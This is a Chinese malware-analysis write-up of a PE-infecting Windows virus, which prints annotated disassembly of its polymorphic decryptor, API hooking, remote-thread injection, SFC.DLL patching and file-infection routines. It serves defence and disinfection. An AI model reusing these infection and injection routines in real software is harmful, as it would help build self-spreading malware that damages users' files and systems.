
# 第三阶段第一题分析+解决

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-277.htm`](https://www.pediy.com/kssd/pediy09/pediy09-277.htm)

> 病毒分析文档

引用:

* * *

;\==============================================================================  
1.病毒概述:  
病毒只感染 `exe` 和 `scr` 文件,病毒代码包括一个变形引导头和加密存放的病毒主体,病毒主体一般写在被感染 pe 文件的最后一个区段,变形引导头位置不固定,可以利用被感染 pe 文件代码段的空隙或覆盖被感染 pe 文件部分代码也可以和病毒主体连在一起,病毒控制权可以通过直接修改被感染 pe 文件的入口获取,还可以从被感染 pe 文件的入口后面的某些位置修改转移到病毒引导入口.  
病毒感染目标程序后,会有一定概率写入`'love'`感染标记,有标记的程序下次不会再感染,没标记的可能会重复感染多次。我们可以利用这个给自己程序做免疫处理，也可以把最后一个区段名改为`'_win'`进行免疫.  
病毒通过 hook 进程的 `NtCreateFile` 和 `NtOpenFile` 来感染新的文件;通过 hook `NtCreateProcess`,`NtCreateProcessEx` 和 `NtCreateUserProcess` 来感染新的进程.  
测试发现也有把文件感染损坏的情况,比如它对 `Load Config Table` 的处理就可能出问题,使文件不能运行.

;==============================================================================  
2.病毒引导头分析  
病毒引导头的变化比较多,中间夹杂一些 junk,寄存器也会变化,一般格式如下:  

```
0041506F   MOV CL,1F                            ;主体解码密钥
00415071   LEA EDX,DWORD PTR DS:[EDX+1]
00415074   DEC ECX
00415075   JNZ SHORT NOTEPAD_.00415071
00415077   STC
00415078   CALL NOTEPAD_.0041507D
0041507D   POP EDI
0041507E   XCHG EBX,EBX
00415080   CLC
00415081   ADD EDI,5A                           ;定位主体位置
00415087   PUSH EDI
00415088   SUB ESI,ESI
0041508A   XOR ESI,2900                         ;主体长度
00415090   JMP SHORT NOTEPAD_.00415092
00415092   MOV EDX,EDX
00415094   XCHG BYTE PTR DS:[EDI],AL            ;读取主体数据
00415096   MOV EDX,EDX
00415098   CMC
00415099   MOV EDX,EDX
0041509B   XCHG EBX,EBX
0041509D   XOR AX,DX                            ;主体解码运算
004150A0   XCHG BYTE PTR DS:[EDI],AL            ;保存解码数据
004150A2   CLD
004150A3   XCHG EBX,EBX
004150A5   NOP
004150A6   JMP SHORT NOTEPAD_.004150A8
004150A8   MOV EDX,EDX
004150AA   CLD
004150AB   NOP
004150AC   NOP
004150AD   MOV EDX,EDX
004150AF   INC EDI
004150B0   DEC ESI
004150B1   JMP SHORT NOTEPAD_.004150B3
004150B3   CLD
004150B4   OR ESI,ESI
004150B6   JNZ SHORT NOTEPAD_.00415094          ;主题解码是否完成
004150B8   POP EDI
004150B9   MOV EBP,0
004150BE   MOV EDX,DWORD PTR SS:[EBP-8]
004150C1   MOV DWORD PTR FS:[0],EDX
004150C7   LEAVE
004150C8   JMP EDI                              ;跳到主体继续执行
```

;==============================================================================  
3.病毒主体分析  
一般都是可以重定位运行的,为了方便分析,我把它重定位到一个方便分析地址.  
病毒主体开始的地方先是一层自解码:  

```
loc_361000:     call    $+5                    ;病毒主体入口
                mov     eax, [esp]
                cld
                mov     [eax+3033h], ebx
                mov     ecx, [eax+28EEh]        ;病毒配置
                mov     ebx, [esp+4]
                and     ecx, 80000000h
                jz      short loc_36104E        ;是否为 oep 入侵,返回地址不同
                pop     ecx
                mov     [eax+3037h], esi
                push    edi
                pop     dword ptr [eax+303Bh]
                cmp     byte ptr [eax+28F2h], 0E8h
                jnz     short loc_361045
                add     ebx, [eax+28F3h]
                mov     ebx, [ebx+2]
                push    dword ptr [ebx]
                jmp     short loc_36104D
loc_361045:     mov     ebx, [eax+28F4h]
                push    dword ptr [ebx]
loc_36104D:     pop     ebx
loc_36104E:     push    ebp
                mov     ebp, eax
                sub     dword ptr [esp+4], 80DCh   ;修正病毒返回地址
                sub     ebp, offset loc_361005
                mov     edi, [esp+4]
                lea     esi, Buffer[ebp]
loc_361069:     mov     ecx, 0                ;如果有抽代码则还原
                rep movsb
                call    sub_361126              ;rdtsc 读取时钟
                mov     ecx, eax
                call    sub_361126              ;rdtsc 读取时钟
                sub     eax, ecx
                jz      short loc_3610F9
                cmp     eax, 0C00h
                ja      short loc_3610F9        ;判断时间差是否合法
                and     ebx, 0FFFFF000h
loc_36108D:     cmp     dword ptr [ebx+4Eh], 'sihT'   ;搜索 kernel32 的 header 特征
                jz      short loc_36109E
loc_361096:     sub     ebx, 100h
                jnz     short loc_36108D
loc_36109E:     mov     eax, ebx
                add     eax, [ebx+3Ch]
                cmp     word ptr [eax], 4550h    ;是否为 PE 标志
                jnz     short loc_361096
                mov     edx, [eax+78h]           ;导出表
                add     edx, ebx
                mov     esi, [edx+20h]
                mov     ecx, [edx+18h]
                add     esi, ebx
                push    ecx
loc_3610B8:     lodsd
                add     eax, ebx
                cmp     word ptr [eax+2], 'Pt'   ;查找 GetProcAddress 函数
                jnz     short loc_3610CC
                cmp     dword ptr [eax+5], 'dAco'
                jz      short loc_3610D1
loc_3610CC:     loop    loc_3610B8
                pop     ecx
                jmp     short loc_3610F9
loc_3610D1:     sub     [esp], ecx
                mov     esi, [edx+24h]
                pop     ecx
                add     esi, ebx
                movzx   eax, word ptr [esi+ecx*2]
                mov     edi, [edx+1Ch]
                add     edi, ebx
                mov     esi, [edi+eax*4]
                add     esi, ebx                ;GetProcAddress
                lea     eax, loc_361140[ebp]    ;待解码数据地址
                mov     dx, [eax-17h]           ;解码密钥
                call    DeCode                ;调用自解码函数
                jmp     short loc_361140        ;跳到自解码后的病毒代码
loc_3610F9:     mov     eax, ss:RandSet[ebp]    ;病毒配置
                and     eax, 80000000h
                jz      short loc_361124
                mov     edi, [esp+4]
                lea     esi, byte_3638F7[ebp]
                movsd                           ;非 oep 入侵需要恢复 5 个原始字节
```



`movsb`

`mov     esi, ss:dword_36403C[ebp]`
`mov     edi, ss:dword_364040[ebp]`
`mov     ebx, ss:dword_364038[ebp]`

`loc_361124:` `pop     ebp`
`retn` `;病毒执行结束,返回原程序`

`sub_361126      proc near`
`rdtsc`
`retn`
`sub_361126      endp`
`db 0A9h` `;解码密钥`
`db  91h`

`DeCode          proc near`
`push    ebx`
`mov     ecx, 27B3h`
`mov     ebx, edx`
`loc_361133:` `xor     [eax], dl`
`sub     dl, bl`
`xchg    dl, dh`
`xchg    bl, bh`
`inc     eax`
`loop    loc_361133`
`pop     ebx`
`retn`
`DeCode          endp`

```
;--------------------------------------------------------------------------
```

经过上面一段解码以后,就可以看到比较完整的病毒代码了:

`loc_361140:` `call    loc_361151`
`db      'CloseHandle',0`
`loc_361151:` `push    ebx`
`call    esi` `;GetProcAddress`
`mov     ss:_CloseHandle[ebp], eax`
`call    loc_36116C`
`db      'CreateEventA',0`
`loc_36116C:` `push    ebx`
`call    esi` `;GetProcAddress`
`mov     ss:_CreateEventA[ebp], eax`
`call    loc_361187`
`db      'GetLastError',0`
`loc_361187:` `push    ebx`
`call    esi` `;GetProcAddress`
`mov     ss:_GetLastError[ebp], eax`
`call    CreateEvent_Vx_4` `;创建 Event`
`test    eax, eax`
`jz      loc_3610F9`
`push    eax`
`call    ss:_GetLastError[ebp]`
`test    eax, eax` `;如果 Event 已经存在,说明系统已经感染`
`jnz     loc_36152D` `;跳到返回原程序的地方`
`cmp     ss:byte_361538[ebp], 1`
`jnz     short loc_3611C9`
`push    ss:dword_364038[ebp]`
`dec     ss:byte_361538[ebp]`
`pop     ss:dword_361590[ebp]`
`jmp     short loc_3611D0`
`loc_3611C9:` `and     ss:dword_361590[ebp], 0`
`loc_3611D0:` `and     ss:dword_361580[ebp], 0`
`and     ss:dword_361584[ebp], 0`
`and     ss:dword_361588[ebp], 0`
`push    edi`
`mov     byte ptr [ebp+3612DDh], 1`
`mov     ss:_GetProcAddress[ebp], esi`
`lea     esi, s->Lstrlen[ebp]`
`xor     ecx, ecx`
`lea     edi, _lstrlen[ebp]`
`mov     cl, 20h`
`call    ImportApi` `;初始化 kernel32 api`
`pop     edi`
`call    ss:_GetVersion[ebp]` `;获取系统版本`
`shr     eax, 1Fh`
`jz      loc_3612EC`
`mov     eax, [edi+14h]` `;WIN98`
`push    40h ; '@'`
`add     eax, ebx`
`push    8001000h`
`mov     ss:dword_363BA6[ebp], eax`
`push    7058h`
`push    0`
`call    ss:_VirtualAlloc[ebp]`
`test    eax, eax`
`jz      loc_36152D`
`xchg    eax, edi`
`lea     esi, loc_361000[ebp]`
`mov     ebp, edi`
`mov     ecx, 0C16h`
`sub     ebp, offset loc_361000`
`lea     edx, loc_36125D[ebp]`
`rep movsd`
`jmp     edx`
`loc_36125D:` `sub     esp, 20h`
`mov     edi, esp`
`push    8`
`xor     eax, eax`
`pop     ecx`
`lea     edx, loc_361B45[ebp]`
`rep stosd`
`mov     edi, esp`
`mov     [edi+10h], edx`
`inc     byte ptr [edi+1Ch]`
`push    edi`
`push    10003h`
`call    ss:dword_363BA6[ebp]`
`add     esp, 20h`
`test    eax, eax`
`jz      loc_36152D`
`xchg    eax, edi`
`push    0`
`push    1`
`push    80000400h`
`push    10000h`
`call    ss:dword_363BA6[ebp]`
`test    eax, eax`
`jz      loc_36152D`
`push    0`
`push    eax`
`push    40000h`
`push    0`
`shr     eax, 0Ch`
`push    edi`
`push    1`
`push    eax`
`push    10001h`
`call    ss:dword_363BA6[ebp]`
`push    1000Ah`
`call    ss:dword_363BA6[ebp]`
`call    sub_Sleep_0A`
`jmp     loc_36152D`
`loc_3612EC:` `cmp     ss:_CreateToolhelp32Snapshot[ebp],0` `;WINNT`
`jz      loc_36152D`
`call    loc_361304`
`db      'NTDLL',0`
`loc_361304:` `call    ss:_GetModuleHandleA[ebp]`
`lea     esi, s->Ntadjustprivilegestoken[ebp]`
`xor     ecx, ecx`
`lea     edi, _NtAdjustPrivilegesToken[ebp]`
`mov     cl, 0Eh`
`xchg    eax, ebx`
`call    ImportApi` `;初始化 ntdll api`
`cmp     ss:_RtlUnicodeStringToAnsiString[ebp], 0`
`jz      loc_36152D`
`mov     eax, ss:_NtCreateFile[ebp]`
`push    dword ptr [eax+1]` `;取 NtCreateFile 系统调用编号`
`pop     dword ptr ss:(New_NtCreateFile+1)[ebp]`
`mov     eax, ss:_NtOpenFile[ebp]`
`push    dword ptr [eax+1]` `;取 NtOpenFile 系统调用编号`



```
pop     dword ptr ss:(New_NtOpenFile+1)[ebp]
mov     eax, ss:_NtCreateProcess[ebp]
push    dword ptr [eax+1]                       ;取 NtCreateProcess 系统调用编号
pop     dword ptr ss:(New_NtCreateProcess+1)[ebp]
mov     ecx, ss:_NtCreateProcessEx[ebp]
jecxz   short loc_36137C
push    dword ptr [ecx+1]                       ;取 NtCreateProcessEx 系统调用编号
pop     dword ptr ss:(New_NtCreateProcessEx+1)[ebp]
mov     ecx, ss:_NtCreateUserProcess[ebp]
jecxz   short loc_36137C
push    dword ptr [ecx+1]                       ;取 NtCreateUserProcess 系统调用编号
pop     dword ptr ss:(New_NtCreateUserProcess+1)[ebp]
loc_36137C:     call    sub_361539
lea     edi, dword_363CB8[ebp]
mov     ecx, edi
push    0
neg     cl
push    dword ptr [eax+4]
and     ecx, 3
push    40h ; '@'
add     edi, ecx
push    edi
push    0
push    18h
lea     esi, s->BasenamedobjectsVtsect[ebp]     ; "\\BaseNamedObjects\\VtSect"
mov     ecx, 19h
lea     eax, ds:0FFFFFFFEh[ecx*2]
stosw
lea     eax, ds:0[ecx*2]
stosw
lea     eax, [edi+4]
stosd
xor     ah, ah
lea     edx, UNICODE_STRING_Vx_SectionName[ebp]
loc_3613C5:     lodsb
mov     [edx], ax                               ;转换 UNICODE_STRING
stosw
add     edx, 2
loop    loc_3613C5
mov     edx, esp
push    0
push    7058h
mov     ecx, esp
push    0
mov     eax, esp
push    0
push    8000000h
push    40h ; '@'
push    ecx
push    edx
push    0Eh
push    eax
call    ss:_NtCreateSection[ebp]                ;创建全局共享内存 VtSect
pop     eax
add     esp, 40h
push    7058h
mov     edx, esp
push    0
mov     ecx, esp
push    40h ; '@'
push    0
push    2
push    edx
push    0
push    7058h
push    0
push    ecx
push    0FFFFFFFFh
push    eax
call    ss:_NtMapViewOfSection[ebp]             ;取得共享内存 VtSect 地址
pop     edi
pop     ecx
test    edi, edi
jz      loc_36152D
lea     esi, loc_361000[ebp]
mov     ecx, 0C16h
mov     ebp, edi
rep movsd                                       ;把病毒体复制到全局共享内存 VtSect
sub     ebp, offset loc_361000
lea     eax, loc_361443[ebp]
jmp     eax                                     ;跳转到 VtSect 区继续执行
loc_361443:     push    eax                     ;此时已经进入 VtSect 区执行
push    esp
push    20h ; ' '
push    0FFFFFFFFh
call    ss:_NtOpenProcessToken[ebp]
test    eax, eax
pop     edi
jnz     short loc_361488
call    loc_3615A7                              ;初始化 LookupPrivilegeValueA 函数
call    loc_36146F
db  'SeDebugPrivilege',0
loc_36146F:     push    edi
call    AdjustPrivilegesToken                   ;提升进程权限
push    ss:hMod_ADVAPI32[ebp]
call    ss:_FreeLibrary[ebp]
push    edi
call    ss:_CloseHandle[ebp]
loc_361488:     push    0
push    2
call    ss:_CreateToolhelp32Snapshot[ebp]       ;创建进程快照
mov     ecx, 128h
xchg    eax, edi
sub     esp, ecx
mov     [esp], ecx
push    esp
push    edi
call    ss:_Process32First[ebp]                 ;遍历进程
xor     esi, esi
and     ss:dword_363CA6[ebp], 0
loc_3614AE:     push    esp
push    edi
call    ss:_Process32Next[ebp]                  ;遍历进程
test    eax, eax
jz      short loc_361520
inc     esi
cmp     esi, 4                                  ;每 4 个进程感染一个
jb      short loc_3614AE
push    dword ptr [esp+8]
push    0
push    2Ah
call    ss:_OpenProcess[ebp]                    ;打开进程
test    eax, eax
loc_3614D0:     jz      short loc_3614AE
xchg    eax, ebx
call    HookProcToVtSect                        ;hook 进程内的 5 个 api
xor     ecx, ecx
xchg    eax, ecx                                ;目标进程的 VtSect 地址
jecxz   short loc_361517
cmp     ss:dword_363CA6[ebp], eax
jnz     short loc_361517
cmp     dword ptr [esp+24h], 'srsc'             ;是否 csrs 开头的进程名
jz      short loc_361517                        ;用来放过 csrss.exe
add     ecx, 0EA0h                              ;远程线程入口地址=VtSect+0EA0h
push    eax
push    esp
push    eax
push    esi
push    ecx
push    eax
push    eax
push    ebx
```



```asm
call    ss:_CreateRemoteThread[ebp]             ;创建远程线程
test    eax, eax
pop     ecx
jz      short loc_361517
push    dword ptr [esp+8]
pop     ss:dword_363CA6[ebp]
call    sub_Sleep_0A
loc_361517:     push    ebx
                call    ss:_CloseHandle[ebp]
                jmp     short loc_3614AE                        ;继续找下一个进程
loc_361520:     add     esp, 128h                               ;进程遍历结束
                push    edi
                call    ss:_CloseHandle[ebp]
loc_36152D:     call    ss:_CloseHandle[ebp]
                jmp     loc_3610F9                              ;跳到返回原程序的地方
```

`HookProcToVtSect` proc near
```asm
push    edi
xor     edi, edi
call    Open_Vx_Section
jz      loc_361B12
push    eax
push    7058h
mov     edx, esp
push    0
mov     ecx, esp
push    40h ; '@'
push    100000h
push    2
push    edx
push    0
push    7058h
push    0
push    ecx
push    ebx
push    eax
call    ss:_NtMapViewOfSection[ebp]
pop     edi
pop     ecx
call    ss:_CloseHandle[ebp]
test    edi, edi
jz      short loc_361B12
mov     ecx, ss:dword_361588[ebp]
jecxz   short loc_361AB5
lea     edx, loc_361000[ebp]
add     edx, ecx
push    edi
push    ebx
call    edx
loc_361AB5:     mov     eax, ss:_NtCreateFile[ebp]
                lea     ecx, [edi+2849h]                        ;New_NtCreateFile
                call    HookProcApi
                mov     eax, ss:_NtOpenFile[ebp]
                lea     ecx, [edi+2896h]                        ;New_NtOpenFile
                call    HookProcApi
                mov     eax, ss:_NtCreateProcess[ebp]
                lea     ecx, [edi+289Dh]                        ;New_NtCreateProcess
                call    HookProcApi
                mov     eax, ss:_NtCreateProcessEx[ebp]
                test    eax, eax
                jz      short loc_361B12
                lea     ecx, [edi+28AAh]                        ;New_NtCreateProcessEx
                call    HookProcApi
                mov     eax, ss:_NtCreateUserProcess[ebp]
                test    eax, eax
                jz      short loc_361B12
                lea     ecx, [edi+28B7h]                        ;New_NtCreateUserProcess
                call    HookProcApi
loc_361B12:     mov     eax, edi                                ;返回目标进程的 VtSect 地址
                pop     edi
                retn
HookProcToVtSect endp
```

`HookProcApi` proc near
```asm
lea     ecx, [ecx-5]
sub     ecx, eax
push    ecx
push    0E8000000h
lea     ecx, [esp+3]
push    0
push    5
push    ecx
push    eax
push    ebx
push    5
mov     ecx, esp
push    eax
mov     edx, esp
push    eax
push    esp
push    40h
push    ecx
push    edx
push    ebx
call    ss:_NtProtectVirtualMemory[ebp]
add     esp, 0Ch
call    ss:_NtWriteVirtualMemory[ebp]
loc_361A24:     add     esp, 8
                retn
HookProcApi     endp
```

## 4.远程线程分析

远程线程可能是用来访问网络的，但目前样本中似乎被修改过，阻止了一些功能。

`Vx_Thread`:
```asm
push    ebp
call    $+5
loc_361EA6:     pop     ebp
                sub     ebp, offset loc_361EA6
loc_361EAD:     mov     ss:byte_361577[ebp], 0
                call    ss:_GetVersion[ebp]                     ;判断系统版本
                shr     eax, 1Fh
                jz      short loc_361EFB
                push    1Eh                                     ;WIN98
loc_361EC1:     mov     esi, ss:dword_363BA6[ebp]
                pop     ecx
loc_361EC8:     lodsb
                cmp     al, 2Eh ; '.'
                jnz     short loc_361EF7
                cmp     word ptr [esi], 1DFFh
                jnz     short loc_361EF7
                lea     edi, dword_363CAA[ebp]
                mov     esi, [esi+2]
                push    edi
                movsd
                movsw
                lea     eax, loc_36381F[ebp]
                pop     dword ptr ss:(loc_363842+3)[ebp]
                cli
                mov     [esi-6], eax
                mov     word ptr [esi-2], cs
                sti
                mov     cl, 1
loc_361EF7:     loop    loc_361EC8
                jmp     short loc_361F4B
loc_361EFB:     call    Open_Vx_Section                         ;NT
                cmp     dword ptr [esp+8], 4
                jnz     short loc_361F4B
                call    loc_361F14
                db      'SFC.DLL',0
loc_361F14:     call    ss:_LoadLibraryA[ebp]                   ;加载 SFC.DLL
                or      eax, eax                                ;破坏 Microsoft Windows File Protection
                jz      short loc_361F2B                        ;以便于感染系统文件
                xchg    eax, ebx
                push    2
                push    ebx
                call    ss:_GetProcAddress[ebp]
                call    eax
                xchg    eax, ebx
loc_361F2B:     call    sub_361DCE                              ;patch 模块 SFC.DLL
                call    loc_361F40
                db      'SFC_OS.DLL',0
```



```asm
loc_361F40:     call    ss:_LoadLibraryA[ebp]
                call    sub_361DCE                              ;patch 模块 SFC_OS.DLL
loc_361F4B:     call    CreateEvent_Vx_4
                dec     dword ptr [ebp+3612DDh]
                xor     ecx, ecx
                lea     eax, dword_364054[ebp]
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    eax
                push    ecx
                push    ecx
                push    ecx
                call    ss:_GetVolumeInformationA[ebp]
                call    loc_361F7C
                db      'USER32.DLL',0
loc_361F7C:     call    ss:_LoadLibraryA[ebp]
                call    loc_361F91
                db      'wsprintfA',0
loc_361F91:     push    eax
                call    ss:_GetProcAddress[ebp]
                mov     ss:_wsprintfA[ebp], eax
                rdtsc
                lea     ecx, s->Advapi32_dll[ebp]  ; "ADVAPI32.DLL"
                mov     ss:RandSeed[ebp], eax
                push    ecx
                call    ss:_LoadLibraryA[ebp]
                xchg    eax, ebx
                push    4
                lea     esi, s->Regclosekey[ebp]  ; "RegCloseKey"
                pop     ecx
                lea     edi, _RegCloseKey[ebp]
                call    ImportApi
                mov     word ptr ss:dword_361E6D[ebp], 5000h
                and     ss:(dword_361E6D+2)[ebp], 0
                lea     edx, s->SoftwareMicrosoftWindowsCurrentversionExplorer[ebp]
                push    eax
                push    esp
                push    1
                push    0
                push    edx
                push    80000002h
                call    ss:_RegOpenKeyExA[ebp]
                test    eax, eax
                pop     edx
                jnz     short loc_36201A
                lea     ecx, s->Targethost[ebp]  ; "TargetHost"
                push    edx
                push    6
                lea     esi, dword_361E6D[ebp]
                push    esp
                push    esi
                push    eax
                push    eax
                push    ecx
                push    edx
                call    ss:_RegQueryValueExA[ebp]
                pop     eax
                call    ss:_RegCloseKey[ebp]
loc_36201A:     mov     ss:byte_363EB7[ebp], 0
                call    loc_362032
                db      'WSOCK32.DLL',0
loc_362032:     call    ss:_LoadLibraryA[ebp]
                xchg    eax, ebx
                push    7
                lea     esi, s->Wsastartup[ebp]  ; "WSAStartup"
                pop     ecx
                lea     edi, _WSAStartup[ebp]
                call    ImportApi
                call    loc_362061
                db      'WININET.DLL',0
loc_362061:     call    ss:_LoadLibraryA[ebp]
                test    eax, eax
                jz      loc_3622A4
                xchg    eax, ebx
                push    5
                lea     esi, s->Internetclosehandle[ebp]  ; "InternetCloseHandle"
                pop     ecx
                lea     edi, _InternetCloseHandle[ebp]
                call    ImportApi
                push    0FFFFFFFFh
                call    ss:_Sleep[ebp]
                pop     ebp
                retn    4
```

;==============================================================================

## 5.函数 HOOK 的分析

`NtOpenFile` 和 `NtCreateFile` 的 hook 处理流程是一样的，用来感染新的文件:

```asm
New_NtOpenFile: mov     eax, 64h                               ;NtOpenFile 系统调用号
                jmp     short loc_36384E
New_NtCreateFile:
                mov     eax, 20h                               ;NtCreateFile 系统调用号
loc_36384E:     pusha
                call    EnterCritical
                jnz     short loc_36388F
                mov     eax, [esp+30h]
                lea     esi, szFileName[ebp]
                mov     edx, [eax+8]
                cmp     word ptr [edx], 206h
                jnb     short loc_36388F
                push    esi
                push    0FF0000h
                mov     eax, esp
                push    0
                push    edx
                push    eax
                call    ss:_RtlUnicodeStringToAnsiString[ebp]
                add     esp, 8
                cmp     dword ptr [esi], '\\??\\'
                jnz     short loc_36388A
                add     esi, 4
loc_36388A:     call    InfectFile                              ;开始感染文件
loc_36388F:     call    LeaveCritical
                popa
                retn
```

```asm
InfectFile      proc near                                       ;感染文件处理函数
                lea     edi, szFileName[ebp]
                cld
loc_3632F8:     mov     ebx, edi
                xor     ecx, ecx
loc_3632FC:     lodsb                                           ;大写转换
                cmp     al, 61h  ; 'a'
                jb      short loc_363307
                cmp     al, 7Ah  ; 'z'
                ja      short loc_363307
                sub     al, 20h  ; ' '
loc_363307:     stosb
                cmp     al, 5Ch  ; '\\'
                jz      short loc_3632F8
                cmp     al, 2Eh  ; '.'
                jz      short loc_3632ED
                cmp     al, 0
                jnz     short loc_3632FC
                jecxz   short locret_3632DF
                mov     eax, [ecx]
                cmp     eax, 'EXE'                              ;EXE 文件可以感染
                jz      short loc_36332A
                cmp     eax, 'RCS'                              ;SCR 文件可以感染
                jnz     locret_36325D
loc_36332A:     mov     eax, [ebx]
                cmp     eax, 'CNIW'                             ;WINC 开头的文件不感染
                jz      locret_36325D
                cmp     eax, 'NUCW'                             ;WCUN 开头的文件不感染
                jz      locret_36325D
                cmp     eax, '23CW'                             ;WC32 开头的文件不感染
                jz      locret_36325D
```



`cmp` `eax`, `'OTSP'` `;PSTO` 开头的文件不感染

`jz` `locret_36325D`

`xor` `ebx`, `ebx`

`call` `BeforeInfect` `;保存文件属性，创建文件映象`

`jnz` `short loc_363371`

`call` `SetFileSecurity` `;设置权限`

`call` `BeforeInfect`

`jz` `locret_36325D`

`loc_363371:` `xor` `edx`, `edx`

`call` `DoInfect` `;生成变形头,把病毒写入 PE 文件`

`call` `sub_3632E0` `;Seh_Handler`

`call` `$+5`

`loc_363382:` `pop` `ebp`

`sub` `ebp`, `offset loc_363382`

`jmp` `loc_363788` `;处理结束，恢复文件属性`

`InfectFile` `endp`

### NtCreateProcess,NtCreateProcessEx 和 NtCreateuserProcess 的 hook 处理流程是一样的，用来感染新的进程

`New_NtCreateProcess proc near`
`mov` `eax`, `29h` `;NtCreateProcess 系统调用号`
`call` `sub_3638C4`
`retn` `20h`
`New_NtCreateProcess endp`

`New_NtCreateProcessEx proc near`
`mov` `eax`, `30h` `;NtCreateProcessEx 系统调用号`
`call` `sub_3638C4`
`retn` `24h`
`New_NtCreateProcessEx endp`

`New_NtCreateUserProcess proc near`
`mov` `eax`, `185h` `;NtCreateUserProcess 系统调用号`
`call` `sub_3638C4`
`retn` `2Ch`
`New_NtCreateUserProcess endp`

`sub_3638C4 proc near`
`lea` `edx`, `[esp+0Ch]`
`int` `2Eh` `;完成原始系统调用`
`cmp` `eax`, `0`
`jl` `short locret_3638E8`
`pusha`
`call` `$+5`
`loc_3638D5:` `mov` `edx`, `[esp+24h+arg_8]`
`pop` `ebp`
`mov` `ebx`, `[edx]`
`sub` `ebp`, `offset loc_3638D5`
`call` `HookProcToVtSect` `;对新的进程进行 hook`
`popa`
`locret_3638E8:` `retn` `4`
`sub_3638C4 endp`

## 6.结束语

语言可能不是十分准确,分析角度也不一定合理,某些细节也会有遗漏,难免有错误之处,请见谅.
谢谢观看.

杀毒源代码及编译好的程序，代码写的较差，测试样本有限，可能有 bug
不敢保证查杀完全正确。

*   附 件：`kvx.rar`

下面是一个感染了病毒的 `notepad.exe`，为了安全请在虚拟机里测试
该样本感染时做了处理，使它以后只能感染某些文件名：`VXME\*.VXE`
解压密码：`vir`
附 件:`VXMEPAD.rar`

`4dd466d0e1e0cc123afbe504da2462ca`
